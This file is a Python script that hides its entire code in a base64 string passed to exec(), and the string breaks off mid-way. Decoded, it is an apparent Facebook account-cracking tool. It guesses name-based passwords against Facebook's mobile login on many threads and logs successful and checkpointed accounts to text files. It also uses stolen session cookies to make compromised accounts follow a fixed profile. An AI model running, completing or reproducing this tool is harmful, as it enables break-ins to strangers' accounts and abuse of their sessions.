import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCBvcwp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMKZXhjZXB0IEltcG9ydEVycm9yOgogICAgcHJpbnQoJ1xuIFvinJNdIGluc3RhbGxpbmcgcmVxdWVzdHMgIS4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQoKdHJ5OgogICAgaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyBmdXR1cmVzICEuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQoKdHJ5OgogICAgaW1wb3J0IGJzNApleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG4gW+Kck10gaW5zdGFsbGluZyBiczQgIS4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykKCmltcG9ydCByZXF1ZXN0cywgb3MsIHJlLCBiczQscGxhdGZvcm0sIHN5cywganNvbiwgdGltZSwgcmFuZG9tLCBkYXRldGltZSwgc3VicHJvY2VzcywgdGhyZWFkaW5nLCBpdGVydG9vbHMsYmFzZTY0LHV1aWQsemxpYgpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIHNhcmZyYXpzc2IKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAKCgpjdCA9IGRhdGV0aW1lLm5vdygpCm4gPSBjdC5tb250aApidWxhbiA9IFsnSmFudWFyeScsICdGZWJydWFyeScsICdNYXJjaCcsICdBcHJpbCcsICdNYXknLCAnSnVuZScsICdKdWx5JywgJ0FndXN0dXMnLCAnU2VwdGVtYmVyJywgJ09jdG9iZXInLCAnTm92ZW1iZXInLCAnRGVjZW1iZXInXQp0cnk6CiAgICBpZiBuIDwgMCBvciBuID4gMTI6CiAgICAgICAgZXhpdCgpCiAgICBuVGVtcCA9IG4gLSAxCmV4Y2VwdCBWYWx1ZUVycm9yOgogICAgZXhpdCgpCgpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkKdGEgPSBjdXJyZW50LnllYXIKYnUgPSBjdXJyZW50Lm1vbnRoCmhhID0gY3VycmVudC5kYXkKb3AgPSBidWxhbltuVGVtcF0KUCA9ICdceDFiWzE7OTdtJyAjIApNID0gJ1wwMzNbMTszMW0nICMgCkggPSAnXDAzM1sxOzMybScgIyAKSyA9ICdceDFiWzE7OTdtJyAjIApCID0gJ1x4MWJbMTs5N20nICMgClUgPSAnXHgxYlsxOzk3bScgIyAKTyA9ICdceDFiWzE7OTdtJyAjIApOID0gJ1x4MWJbMG0nICAgICMgCm15X2NvbG9yID0gWwogUCwgTSwgSCwgSywgQiwgVSwgTywgTl0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQpkYXRhLGRhdGEyPXt9LHt9CmFtYW4sY3Asc2FsYWg9MCwwLDAKdWJhaFAsZnVjayxwd0JhcnU9W10sW10sW10Kb2sgPSBbXQpjcCA9IFtdCmlkID0gW10KdXNlciA9IFtdCmxvb3AgPSAwCnVybF9sb29rdXAgPSAiaHR0cHM6Ly9sb29rdXAtaWQuY29tLyIKdXJsX21iID0gImh0dHBzOi8vbS5mYWNlYm9vay5jb20iCnVybF9pcCA9ICJodHRwczovL3d3dy5odHRwYmluLm9yZy9pcCIKaGVhZGVyX2dydXAgPSB7InVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIn0KYnVsYW5fdHRsID0geyIwMSI6ICJKYW51YXJ5IiwgIjAyIjogIkZlYnJ1YXJ5IiwgIjAzIjogIk1hcmNoIiwgIjA0IjogIkFwcmlsIiwgIjA1IjogIk1heSIsICIwNiI6ICJKdW5lIiwgIjA3IjogIkp1bHkiLCAiMDgiOiAiQXVndXN0dXMiLCAiMDkiOiAiU2VwdGVtYmVyIiwgIjEwIjogIk9jdG9iZXIiLCAiMTEiOiAiTm92ZW1iZXIiLCAiMTIiOiAiRGVjZW1iZXIifQpkb25lID0gRmFsc2UKCmRlZiBqYWxhbih6KToKICAgIGZvciBlIGluIHogKyAnXG4nOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMDEpCgpibHVlPSAnXDMzWzk0bScKbGlnaHRibHVlID0gJ1wwMzNbOTRtJwpyZWQgPSAnXDAzM1s5MW0nCndoaXRlID0gJ1wzM1s5N20nCnllbGxvdyA9ICdcMzNbOTNtJwpncmVlbiA9ICdcMDMzWzE7MzJtJwpjeWFuICA9ICJcMDMzWzk2bSIKZW5kID0gJ1wwMzNbMG0nCmJsYWNrPSJcMDMzWzA7MzBtIgpwaW5rPSJceDFiWzk1bSIKYmx1ZT0iXHgxYls5NG0iCnVuZGVybGluZT0nXHgxYls0bScKY29sb3Vyb2ZmPSJceDFiWzAwbSIKbG9nbz0iIiIgClwwMzNbMTs5MW0gIyMgICAgICMjICAgICMjIyAgICAjIyAgICAgIyMgICAgIyMjICAgICMjIyMjIyMjICAjIyMjIApcMDMzWzE7OTJtICMjIyAgICMjIyAgICMjICMjICAgIyMgICAgICMjICAgIyMgIyMgICAjIyAgICAgIyMgICMjClwwMzNbMTs5M20gIyMjIyAjIyMjICAjIyAgICMjICAjIyAgICAgIyMgICMjICAgIyMgICMjICAgICAjIyAgIyMgIApcMDMzWzE7OTFtICMjICMjIyAjIyAjIyAgICAgIyMgIyMjIyMjIyMjICMjICAgICAjIyAjIyAgICAgIyMgICMjClwwMzNbMTs5Mm0gIyMgICAgICMjICMjIyMjIyMjIyAjIyAgICAgIyMgIyMjIyMjIyMjICMjICAgICAjIyAgIyMKXDAzM1sxOzkzbSAjIyAgICAgIyMgIyMgICAgICMjICMjICAgICAjIyAjIyAgICAgIyMgIyMgICAgICMjICAjIyAgClwwMzNbMTs5MW0gIyMgICAgICMjICMjICAgICAjIyAjIyAgICAgIyMgIyMgICAgICMjICMjIyMjIyMjICAjIyMjCgpcMDMzWzE7OTJt4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiCiAgICAgXDAzM1sxOzkybeKeoyBcMDMzWzE7OTJtREVWT0xQRVIgICA6ICAgICAgICAgICAgQUJEVUxMQUggS0lORwogICAgIFwwMzNbMTs5MW3inqMgXDAzM1sxOzkxbUZBQ0VCT09LICAgOiAgICAgICAgICAgIEFCRFVMTEFIIEtJTkcKICAgICBcMDMzWzE7OTJt4p6jIFwwMzNbMTs5Mm1XSEFUU0FQUCAgIDogICAgICAgICAgICAwMzEwNTE5NDAzMgogICAgIFwwMzNbMTs5MW3inqMgXDAzM1sxOzkxbUdJVEhVQiAgICAgOiAgICAgICAgICAgIEFCRFVMTEFICiAgICAgXDAzM1sxOzkybeKeoyBcMDMzWzE7OTJtVE9PTFMgICAgICA6ICAgICAgICAgICAgRklMRSBDTE9OSU5HClwwMzNbMTs5Mm3igKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKIKIiIiCgoKdHJ5OgogICAga2V5MT1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3InKS5yZWFkKCkKZXhjZXB0IElPRXJyb3I6CiAgICBrb2s9b3BlbigiL3N0b3JhZ2UvZW11bGF0ZWQvMC9hbmRyb2lkOC50eHQiLCd3JykKICAgIG15aWQ9dXVpZC51dWlkNCgpLmhleFs6MTJdCiAgICBmPSJIaWRkZW4tQWJkdWxsYWgjIgogICAga2V5PW15aWQrZgogICAga29rLndyaXRlKGtleSkKICAgIGtvay5jbG9zZSgpCiAgICBwcmludChrZXkpCgphPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9naXRodWIuY29tL1BhaWRVc2VyMS9Pay5pZHMvYmxvYi9tYWluL0FwcHJvdmFsLmFkZCIpLnRleHQKYj1zdHIoYSkKa2V5MT1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3InKS5yZWFkKCkKa2V5Mj1zdHIoa2V5MSkgIAppZiBrZXkyIGluIGI6CiAgICBwYXNzCiAgICAKZWxzZToKICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgcHJpbnQKICAgIHByaW50KGdyZWVuKyJZb3VyIGtleSAgOiAiK2tleTIpCiAgICBwcmludCh5ZWxsb3crIlxuXHRcdENvbnRhY3QgQWRtaW4gIikKICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2JoYXR0aTQwNTUnKQogICAgZXhpdCgpCiAgICAKb3Muc3lzdGVtKCJjbGVhciIpCmRlZiBoYXNpbChPSyxjcCk6CglpZiBub3QgbGVuKE9LKSAhPSAwOgoJICAgIHBhc3MKCWlmIGxlbihjcCkgIT0gMDoKCSAgICBwcmludCgnXG5cbiAgXHgxYlsxOzkybSBUb3RhbCBPSyA6IFx4MWJbMTs5MW0gJXMgIFx4MWJbMTs5Mm1BYmR1bGxhaF9PSy50eHQnICUgKEgsIFAsIHN0cihsZW4ob2spKSkpCgkgICAgcHJpbnQoJyAgXHgxYlsxOzkxbSBUb3RhbCBDUCA6XHgxYlsxOzkxbSAgICVzIFx4MWJbMTs5MW1BYmR1bGxhaF9DUC50eHQnICUgKEgsIFAsIHN0cihsZW4oY3ApKSkpCgkgICAgaW5wdXQoIlx4MWJbMTs5M21QcmVzcyBlbnRlciB0byBiYWNrIEFiZHVsbGFoIE1lbnUgIikKCSAgICBzYXJmcmF6KCkKCmRlZiBzYXJmcmF6KCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBpcG0gPSByZXF1ZXN0cy5nZXQodXJsX2lwKS5qc29uKCkKICAgIHRvZHogPSAnJwogICAgSVAgPSBpcG1bJ29yaWdpbiddCiAgICBwcmludAogICAgcHJpbnQocmVkKycgWzFdIFNUQVJUIENSQUNLJykKICAgIHByaW50KGdyZWVuICsnIFsyXSBGSUxFIE1BS0UnKQogICAgcHJpbnQoeWVsbG93ICsnIFswXSBFWElUJykKICAgIHByaW50KCcnKQogICAgX3NhcmZyYXpfX18gPSBpbnB1dCh5ZWxsb3crJyBbKl0gQ2hvb3NlIG9wdGlvbiA6ICcpCiAgICBpZiBfc2FyZnJhel9fXyBpbiAoJzEnLCAnMDEnKToKICAgICAgICBfX3h4eF9fKCkuc2FyZnJhengoaWQpCiAgICBpZiBfc2FyZnJhel9fXyBpbiAoJzInLCAnMDInKToKICAgIAlvcy5zeXN0ZW0oInB5dGhvbiBmaWxlbWFrZS5weSIpCiAgICBpZiBfc2FyZnJhel9fXyBpbiAoJ0UnLCAnZWUnKToKICAgICAgICBwYXNzCgoKY2xhc3MgX194eHhfXzoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmlkID0gW10KICAgIGRlZiBzYXJmcmF6eChzZWxmLGlkKToKICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICBwcmludChsb2dvKQogICAgICAgIHNlbGYuY250ID0gaW5wdXQoeWVsbG93KydQdXQgRmlsZSBOYW1lIDogJykKICAgICAgICBzZWxmLmlkID0gb3BlbihzZWxmLmNudCkucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pCiAgICAgICAgcHJpbnQoIiIpCiAgICAgICAgX19fd29ybGR3aWRlX19fID0gKCd5JykKICAgICAgICBpZiBfX193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToKICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJyBbIV0gQ2hvb3NlIENvcnJlY3QgT25lJyk7CiAgICAgICAgICAgIHNlbGYuc2FyZnJhengoaWQpCiAgICBkZWYgX19tZXRvZGVfXyhzZWxmLCB1c2VyLCBfX2NoaV9fLCBjZWJvayk6CiAgICAgICAgZ2xvYmFsIG9rLGNwLGxvb3AKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYiXHIgXHgxYlsxOzkzbVtBYmR1bGxhaC1DSEVDS10ge2xvb3B9fHtsZW4oc2VsZi5pZCl9IFtva11be2xlbihvayl9XSBbY3BdW3tsZW4oY3ApfV0gIikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBwdyBpbiBfX2NoaV9fOgogICAgICAgICAgICAgICAgcHcgPSBwdy5sb3dlcigpCiAgICAgICAgICAgICAgICBzZXNzaW9uPXJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICAgICAgaGVhZGVyID0gewogICAgICAgICAgICAgICAgICAgICJIb3N0IjpjZWJvaywKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjoiTm9raWFDMy0wMC81LjAgKDA4LjYzKSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwKICAgICAgICAgICAgICAgICAgICAiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAiZG50IjoiMSIsCiAgICAgICAgICAgICAgICAgICAgIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5IiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsCiAgICAgICAgICAgICAgICAgICAgInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tLyIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHIgPSBzZXNzaW9uLmdldChmImh0dHBzOi8ve2NlYm9rfS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwgaGVhZGVycz1oZWFkZXIpCiAgICAgICAgICAgICAgICBkYXMgPSB7CiAgICAgICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoci50ZXh0KSkuZ3JvdXAoMSksCiAgICAgICAgICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihyLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgICAgICAgICAidWlkIjp1c2VyLAogICAgICAgICAgICAgICAgICAgICJmbG93IjoibG9naW5fbm9fcGluIiwKICAgICAgICAgICAgICAgICAgICAicGFzcyI6cHcsCiAgICAgICAgICAgICAgICAgICAgIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGhlYWRlcjEgPSB7CiAgICAgICAgICAgICAgICAgICAgIkhvc3QiOmNlYm9rLAogICAgICAgICAgICAgICAgICAgICJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwKICAgICAgICAgICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLAogICAgICAgICAgICAgICAgICAgICJvcmlnaW4iOiJodHRwczovLyIrY2Vib2ssCiAgICAgICAgICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICAgICAgICAgInVzZXItYWdlbnQiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNBTVNVTkcgU00tRzc4MEcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzE2LjAgQ2hyb21lLzkyLjAuNDUxNS4xNjYgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLAogICAgICAgICAgICAgICAgICAgICJ4LXJlcXVlc3RlZC13aXRoIjoiWE1MSHR0cFJlcXVlc3QiLAogICAgICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6InNhbWUtb3JpZ2luIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiJjb3JzIiwKICAgICAgICAgICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiJlbXB0eSIsCiAgICAgICAgICAgICAgICAgICAgInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLAogICAgICAgICAgICAgICAgICAgICJyZWZlcmVyIjoiaHR0cHM6Ly8iK2NlYm9rKyIvaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsCiAgICAgICAgICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUgYnIiLAogICAgICAgICAgICAgICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHBvID0gc2Vzc2lvbi5wb3N0KGYiaHR0cHM6Ly97Y2Vib2t9L2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wIiwgZGF0YSA9IGRhcywgaGVhZGVycyA9IGhlYWRlcjEsIGFsbG93X3JlZGlyZWN0cyA9IEZhbHNlKQogICAgICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQogICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7SH0gW0FiZHVsbGFoLU9LXSB7dXNlcn0gfCB7cHd9IikKICAgICAgICAgICAgICAgICAgICB3cnQgPSAnJXN8JXMnICUgKHVzZXIscHcpCiAgICAgICAgICAgICAgICAgICAgb2suYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICBvcGVuKCdBYmR1bGxhaF9PSy50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5mb2xsb3coc2Vzc2lvbixjb2tpKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHRva2VueiA9IG9wZW4oJy50b2tlbi50eHQnKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgY3BfdHRsID0gc2Vzc2lvbi5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97dXNlcn0/ZmllbGRzPWJpcnRoZGF5JmFjY2Vzc190b2tlbj17dG9rZW56fScpLmpzb24oKVsnYmlydGhkYXknXQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCwgZGF5LCB5ZWFyID0gY3BfdHRsLnNwbGl0KCcvJykKICAgICAgICAgICAgICAgICAgICAgICAgbW9udGggPSBidWxhbl90dGxbbW9udGhdCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCdcciVzIFtBYmR1bGxhaC1DUF0gJXMgfCAlcyAnICUgKE0sIHVzZXIsIHB3KSkKICAgICAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQogICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCdBYmR1bGxhaF9DUC50eHQnICwgJ2EnKS53cml0ZSgnJXNcbicgJSB3cnQpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gJycKICAgICAgICAgICAgICAgICAgICAgICAgZGF5ICAgPSAnJwogICAgICAgICAgICAgICAgICAgICAgICB5ZWFyICA9ICcnCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJ1xyJXMgW0FiZHVsbGFoLUNQXSAlcyB8ICVzICcgJSAoTSwgdXNlciwgcHcpKQogICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykKICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQod3J0KQogICAgICAgICAgICAgICAgICAgIG9wZW4oJ0FiZHVsbGFoX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBsb29wKz0xCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQoKICAgIGRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6CiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDc2MDcwNTQ4NDUnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgc3RyaW5nPSdJa3V0aScpLmdldCgnaHJlZicpCiAgICAgICAgc2Vzc2lvbi5nZXQoKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCkpLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQKCiAgICBkZWYgX19wbGVyX18oc2VsZik6CiAgICAgICAgcHJpbnQoIlwwMzNbMTs5MW1bMV0gQ3JhY2sgV2l0aCBBdXRvIFBhc3MgIikKICAgICAgICBwcmludCgiXDAzM1sxOzkybVsyXSBDcmFjayBXaXRoIE5hbWUgRGlnaXQgUGFzcyIpCiAgICAgICAgY2hpID0gaW5wdXQoJ1xuWypdIENob29zZTogJykKICAgICAgICBpZiBjaGkgPT0gJyc6CiAgICAgICAgICAgIHByaW50KCdcblNlbGVjdCBDb3JyZWN0IE9uZScpCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQogICAgICAgIGVsaWYgY2hpIGluICgnMScsICcwMScpOgogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgICAgcHJpbnQobG9nbykKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszMW1cciAgICAgICAgICAgICAgICBUSElTIFRPT0wgT05MWSBEQVRBIFVTRVJcMDMzWzE7MzdtIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszMm3igKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKIiKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzMzbSBUb3RhbCBBdXRvIGZpbGUgSURzIDogJXMgJyAlIGxlbihzZWxmLmlkKSkKICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTszNG0gQ3JhY2tpbmcgU3RhcnRlZC4uLicpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzJt4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiIikKICAgICAgICAgICAgd2l0aCBzYXJmcmF6c3NiKG1heF93b3JrZXJzPTMwKSBhcyBzc2J3b3JsZDoKICAgICAgICAgICAgICAgIGZvciB6c2IgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgdWlkLCBuYW1lID0genNiLnNwbGl0KCd8JykKICAgICAgICAgICAgICAgICAgICAgICAgeHogPSBuYW1lLnNwbGl0KCcgJykKICAgICAgICAgICAgICAgICAgICAgICAgZmlyc3QsIGxhc3QgPSBuYW1lLnNwbGl0KCcgJykKICAgICAgICAgICAgICAgICAgICAgICAgZmlyc3RsID0gZmlyc3QubG93ZXIoKQogICAgICAgICAgICAgICAgICAgICAgICBsYXN0bCA9IGxhc3QubG93ZXIoKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJzdHMgPSBmaXJzdC5jYXBpdGFsaXplKCkKICAgICAgICAgICAgICAgICAgICAgICAgbGFzdHMgPSBsYXN0LmNhcGl0YWxpemUoKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbZmlyc3RsKycgJytsYXN0bCwgeHpbMF0rIjEyMzQ1IiwgeHpbMF0rIjEyMyJdCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbZmlyc3RsKycgJytsYXN0bCwgeHpbMF0rIjEyMzQ1IiwgeHpbMF0rIjEyMyJdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbZmlyc3RsKycgJytsYXN0bCwgeHpbMF0rIjEyMzQ1IiwgeHpbMF0